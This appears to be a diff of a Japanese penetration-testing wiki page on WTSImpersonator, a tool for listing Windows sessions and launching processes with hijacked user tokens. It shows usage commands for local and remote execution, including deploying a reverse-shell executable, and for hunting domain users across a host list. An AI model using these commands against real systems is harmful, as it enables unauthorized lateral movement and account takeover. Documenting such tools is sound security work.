@@ -2,53 +2,53 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**WTS Impersonator** ツールは、**"\\pipe\LSM_API_service"** RPC Named pipe を悪用して、ログイン中のユーザーをステルスに列挙し、そのトークンをハイジャックします。これにより、従来の Token Impersonation techniques を回避できます。この手法は、ネットワーク内でのシームレスな lateral movements を可能にします。この技術の革新は **Omri Baso** によるもので、その成果は [GitHub](https://github.com/OmriBaso/WTSImpersonator) で公開されています。<sup>[[1]](#references)</sup>
+**WTSImpersonator**はOmri Basoによるツールで、`\\pipe\LSM_API_service` RPC named pipeを通じて公開されているWindows Terminal Services APIsを使用し、ログオン中のセッションを列挙して、選択したユーザーのtokenでプロセスを起動します。ローカルでの列挙と実行に加え、リモートのサービスベースのワークフローにも対応しています。<sup>[[1]](#references)</sup>
 
-### Core Functionality
+## 基本機能
 
-このツールは、一連の API calls を通じて動作します:
-```bash
+ローカルでの実行フローでは、次のAPIシーケンスを使用します。<sup>[[1]](#references)[[2]](#references)</sup>
+```text
 WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
 ```
-### 主要モジュールと使用方法
+## Modules と usage
 
-- **ユーザーの列挙**: このツールでは、ローカルおよびリモートのユーザー列挙が可能です。それぞれのシナリオに対応するコマンドを使用します。
+- **ユーザーの列挙:** このツールは、ローカルまたはリモートホスト上のセッションを列挙できます。
 
 - ローカル:
 ```bash
 .\WTSImpersonator.exe -m enum
 ```
-- IPアドレスまたはホスト名を指定したリモート:
+- リモートでは、IPアドレスまたはホスト名を指定します:
 ```bash
 .\WTSImpersonator.exe -m enum -s 192.168.40.131
 ```
 
-- **コマンドの実行**: `exec` および `exec-remote` モジュールを動作させるには、**Service** コンテキストが必要です。ローカル実行では、WTSImpersonatorの実行ファイルとコマンドだけが必要です。
+- **コマンドの実行:** `exec` および `exec-remote` モジュールには、service context が必要です。Microsoft のドキュメントでは、`WTSQueryUserToken` は呼び出し元が `LocalSystem` として `SE_TCB_NAME` privilege を持つ状態で実行される必要があると説明されています。<sup>[[2]](#references)</sup>
 
-- ローカルでコマンドを実行する例:
+- ローカルでのコマンド実行:
 ```bash
 .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
 ```
-- Serviceコンテキストを取得するには、PsExec64.exeを使用できます:
+- PsExec を使用すると、テスト用に `LocalSystem` の command prompt を起動できます:
 ```bash
 .\PsExec64.exe -accepteula -s cmd.exe
 ```
 
-- **リモートコマンド実行**: PsExec.exeと同様に、リモートでServiceを作成およびインストールし、適切な権限で実行できるようにします。
+- **リモートでのコマンド実行:** remote mode は PsExec に似た workflow で target 上に service を作成するため、その service を install および start する権限が必要です。<sup>[[1]](#references)</sup>
 
-- リモート実行の例:
+- 例:
 ```bash
 .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```
 
-- **User Hunting Module**: 複数のマシン上で特定のユーザーを対象とし、そのユーザーの認証情報でコードを実行します。これは、複数のシステムでローカル管理者権限を持つDomain Adminsを対象とする場合に特に有用です。
+- **ユーザーの探索:** `user-hunter` モジュールは、host list を検索して指定されたユーザーの session を見つけ、その context で指定された program の実行を試みます。<sup>[[1]](#references)</sup>
 - 使用例:
 ```bash
 .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
 ```
 
-## 参考資料
+## References
 
-- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)
-
+- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
+- [2] [Microsoft: `WTSQueryUserToken` 関数](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
 {{#include ../../banners/hacktricks-training.md}}
